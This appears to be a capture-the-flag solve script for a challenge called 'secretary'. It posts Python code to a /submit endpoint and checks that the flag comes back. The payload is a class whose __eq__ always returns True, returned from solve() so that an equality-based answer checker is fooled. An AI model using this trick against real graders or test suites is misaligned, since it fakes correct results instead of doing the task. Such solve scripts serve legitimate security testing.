import requests
import argparse
import yaml
import logging
import re
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / 'meta.yml'))['flags']
OAST = re.compile(r'\[.*INF.*\] ([a-z0-9]+\.[a-z0-9]+\.[a-z]+)')

logger = logging.getLogger('secretary')

def test(url):
    payload = '''
class A:
  def __eq__(a,b):
    return True

def solve(a, m, b):
  return A()
'''
    logger.debug('Payload: %s', payload)
    res = requests.post(f'{url}/submit', data={'code': payload})

    assert FLAG in (h := res.text), h

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', default='http://localhost:5000', nargs='?')
    args = parser.parse_args()

    test(args.url)
